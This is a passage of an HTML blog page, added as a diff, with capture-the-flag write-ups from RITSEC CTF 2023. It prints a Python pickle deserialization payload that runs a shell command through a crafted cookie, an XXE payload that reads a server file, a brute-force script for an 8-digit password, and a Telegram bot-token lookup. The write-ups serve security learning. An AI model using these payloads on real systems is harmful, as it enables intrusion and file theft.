+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>:  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):  
+</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;ls&#39;</span>,<span style="color:#e6db74">&#39;-a&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> subprocess<span style="color:#f92672">.</span>check_output, (cmd,)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:  
+</span></span><span style="display:flex;"><span>    pickled <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(RCE())  
+</span></span><span style="display:flex;"><span>    print(base64<span style="color:#f92672">.</span>urlsafe_b64encode(pickled))
+</span></span></code></pre></div><pre tabindex="0"><code class="language-ouput" data-lang="ouput">b&#39;gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMAmxzlIwCLWGUhpSFlFKULg==&#39;
+</code></pre><p>We save the cookie and refresh the page</p>
+<p><em>The RCE works</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403105756.png" alt="site"></p>
+<p><em>The site&rsquo;s security flaw</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/order&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">order</span>():
+</span></span><span style="display:flex;"><span>    cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;order&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(b64decode(cookie)) <span style="color:#75715e"># Execution du code ici</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;index&#34;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;order.html&#34;</span>, order<span style="color:#f92672">=</span>data)
+</span></span></code></pre></div><ol>
+<li>
+<p>Here we have the deserialization of the cookie pickle.loads(b64decode(cookie))</p>
+</li>
+<li>
+<p>The code does not check if the data in the cookie has been changed or manipulated by the user before deserializing it.</p>
+</li>
+</ol>
+<h4 id="x-men-lore">X-Men Lore</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180641.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403115255.png" alt="Hint"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403115303.png" alt="Hint"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403140552.png" alt="site"></p>
+<p>The application generates a page for each character based on the user&rsquo;s cookie, which is a base64 encoded XML string.</p>
+<p><strong>XML External Entity</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(b64encode(<span style="color:#e6db74">&#34;&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;&lt;!DOCTYPE input [&lt;!ENTITY flag SYSTEM &#39;file:///flag&#39;&gt;]&gt;&lt;input&gt;&lt;xmen&gt;&amp;flag;&lt;/xmen&gt;&lt;/input&gt;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)))
+</span></span></code></pre></div><pre tabindex="0"><code class="language-output" data-lang="output">`b&#39;PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48IURPQ1RZUEUgaW5wdXQgWzwhRU5USVRZIGZsYWcgU1lTVEVNICdmaWxlOi8vL2ZsYWcnPl0+PGlucHV0Pjx4bWVuPiZmbGFnOzwveG1lbj48L2lucHV0Pg==&#39;`
+</code></pre><p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403143217.png" alt="output"></p>
+<h4 id="broken-bot">Broken Bot</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403143532.png" alt="Consigne"></p>
+<p><em>the main page</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403143554.png" alt="Auth"></p>
+<p><em>The source code</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403145448.png" alt="code source"></p>
+<p>I use the CyberChef tool to beautify the minified code</p>
+<p><em>we beautify and retrieve a telegram bot token</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403152454.png" alt="cyberchef"></p>
+<p>there is a token, it corresponds to a telegram bot. To retrieve the information we can use this site <code>https://api.telegram.org/botYOUR_TOKEN/getMe</code>
+<em>we retrieve the bot&rsquo;s name</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403152235.png" alt="output"></p>
+<p><em>we have the flag</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403152304.png" alt="output"></p>
+<h3 id="reversing-1">Reversing</h3>
+<h4 id="cats-at-play">Cats At Play</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403223454.png" alt="Consigne"></p>
+<p><em>ctrl + f</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403223445.png" alt="file"></p>
+<h4 id="guess-the-password">Guess the Password</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403233339.png" alt="Consigne"></p>
+<p><em>the password is an 8-digit integer</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404120608.png" alt="file"></p>
+<p>At a quick glance at encoding.py, it looks like <code>check_input()</code> hashes <code>user_input</code> and checks if it equals the key. <code>flag_from_pwd()</code> takes a <code>key</code>, xor it against <code>secret</code> and returns it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flag_from_pwd</span>(self, key):
+</span></span><span style="display:flex;"><span>    byte_secret <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>secret<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    byte_key <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(byte_secret, byte_key))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_input</span>(self, user_input):
+</span></span><span style="display:flex;"><span>    hashed_user_input <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>hash(user_input)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hashed_user_input <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>hashed_key
+</span></span></code></pre></div><p>we will brute force the key</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> encoding <span style="color:#f92672">import</span> Encoder
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    encoder <span style="color:#f92672">=</span> Encoder(<span style="color:#e6db74">&#34;supersecret.json&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We know the password is 8 digits, so lets generate all possible combinations</span>
+</span></span><span style="display:flex;"><span>    possible_answers <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100000000</span>):
+</span></span><span style="display:flex;"><span>        possible_answer <span style="color:#f92672">=</span> str(i)
+</span></span><span style="display:flex;"><span>        possible_answer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(possible_answer)) <span style="color:#f92672">+</span> possible_answer
+</span></span><span style="display:flex;"><span>        possible_answers<span style="color:#f92672">.</span>append(possible_answer)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Generated possible passwords...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Starting checks...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># now possible_answers is a set that has &#34;00000000&#34;, &#34;00000001&#34;, ..., &#34;99999999&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we can now try brute forcing the flag</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> possible_answer <span style="color:#f92672">in</span> possible_answers:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> encoder<span style="color:#f92672">.</span>check_input(possible_answer):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The password is probably: </span><span style="color:#e6db74">{</span>possible_answer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">=</span> encoder<span style="color:#f92672">.</span>flag_from_pwd(possible_answer)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;That means the flag is something like &lt;RS</span><span style="color:#e6db74">{</span> {flag} <span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Done with checks!&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The user could also feed the secret to the server, and it should spit out the flag</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><pre tabindex="0"><code class="language-output" data-lang="output">The password is probably: 54744973
+</code></pre><p><em>server</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404121032.png" alt="serv"></p>
+<h3 id="chandi-bot-1">Chandi Bot</h3>
+<h4 id="chandi-bot-1-1">Chandi bot 1</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165203.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165341.png" alt="bot"></p>
+<h4 id="chandi-bot-2">Chandi bot 2</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165211.png" alt="Consigne"></p>
+<p><em>list of commands</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165640.png" alt="bot"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165623.png" alt="bot"></p>
+<h4 id="chandi-bot-3">Chandi bot 3</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165220.png" alt="Consigne"></p>
+<p><em>we give an image to the bot and it gives us one back</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230401021507.png" alt="bot"></p>
+<p><em>Using zsteg tool</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230401021425.png" alt="bot"></p>
+<h4 id="chandi-bot-4">Chandi bot 4</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165234.png" alt="Consigne"></p>
+<p>We automatically lose but a negative bet works</p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403221852.png" alt="bot"></p>
+<h4 id="chandi-bot-5">Chandi bot 5</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165243.png" alt="Consigne"></p>
+<p>Quiz on the organization that held this CTF</p>
+<h4 id="chandi-bot-6">Chandi bot 6</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403165254.png" alt="Consigne"></p>
+<p><em>file modification</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403223122.png" alt="bot"></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-completed">Challenge completed</a>
+      <ul>
+        <li><a href="#crypto">Crypto</a></li>
+        <li><a href="#misc">Misc</a></li>
+        <li><a href="#forensics">Forensics</a></li>
+        <li><a href="#steganography">Steganography</a></li>
+        <li><a href="#web">Web</a></li>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#chandi-bot">Chandi Bot</a></li>
+      </ul>
+    </li>
+    <li><a href="#write-ups">Write-ups</a>
+      <ul>
+        <li><a href="#crypto-1">Crypto</a></li>
+        <li><a href="#misc-1">Misc</a></li>
+        <li><a href="#forensics-1">Forensics</a></li>
+        <li><a href="#steganography-1">Steganography</a></li>
+        <li><a href="#web-1">Web</a></li>
+        <li><a href="#reversing-1">Reversing</a></li>
+        <li><a href="#chandi-bot-1">Chandi Bot</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&text=RITSEC%20CTF%202023%20-%20Full" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&is_video=false&description=RITSEC%20CTF%202023%20-%20Full" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=RITSEC%20CTF%202023%20-%20Full&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&name=RITSEC%20CTF%202023%20-%20Full&description=redonne%20moi%20cette%20page%20markdown%20mais%20quand%20il%20y%20a%20du%20texte%20traduit%20en%20anglais%3a%0ainfo%20%3a%20https%3a%2f%2fctftime.org%2fevent%2f1860%0aChallenge%20completed%20Crypto%20Either%20or%20Neither%20nor%20A%20Fine%20Cipher%20Misc%20New%20Hire%20Wild%20Stocks%20Connection%20Terminated%20Forensics%20Red%20Team%20Activity%201%20Red%20Team%20Activity%202%20Red%20Team%20Activity%203%20Red%20Team%20Activity%204%20Steganography%20Weird%20turtle%20QR%20Web%20Echoes%20Rick%20Roll%20Pickle%20Store%20X-Men%20Lore%20Broken%20Bot%20Reversing%20Cats%20At%20Play%20Guess%20the%20Password%20Chandi%20Bot%20Chandi%20bot%201%20Chandi%20bot%202%20Chandi%20bot%203%20Chandi%20bot%204%20Chandi%20bot%205%20Chandi%20bot%206%20Write-ups%20Crypto%20Either%20or%20Neither%20nor%20The%20flag%20format%20is%20%26ldquo%3bMetaCTF%7b%2a%7d%26rdquo%3b." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&t=RITSEC%20CTF%202023%20-%20Full" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  Imad 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+
+</html>
